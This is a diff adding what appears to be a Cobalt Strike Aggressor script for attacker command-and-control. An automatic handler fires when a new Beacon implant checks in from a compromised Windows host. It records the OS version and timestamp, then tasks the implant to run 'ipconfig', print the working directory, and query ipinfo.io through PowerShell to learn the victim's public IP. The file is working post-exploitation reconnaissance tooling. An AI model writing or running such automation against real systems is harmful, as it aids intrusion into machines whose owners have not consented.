@@ -1,0 +1,31 @@
+
+sub winVer {
+    $ver = binfo($1,'ver');
+     if ($ver eq "6.1"){
+        $version = "Win7/2008";
+     }
+     else if ($ver eq "6.2"){
+        $version = "Win8/2012";
+     }
+     else if ($ver eq "6.3"){
+        $version = "Win8.1/2012 R2";
+     }
+     else if ($ver eq "10.0"){
+        $version = "Win10/2016";
+     }
+     else{
+        $version = "Unknown";
+     }
+     return $version;
+}
+
+on beacon_initial {
+    blog($1,"Initial check in tasking:");
+    $windowsVersion = winVer($1);
+    $ts = formatDate('MM/dd HH:mm:ss (z)');
+    bnote($1,"New: $ts $+  - $windowsVersion");
+    bshell($1,"ipconfig");
+    bpwd($1);
+    bpowershell($1, 'Invoke-RestMethod -Uri http://ipinfo.io/');
+
+}
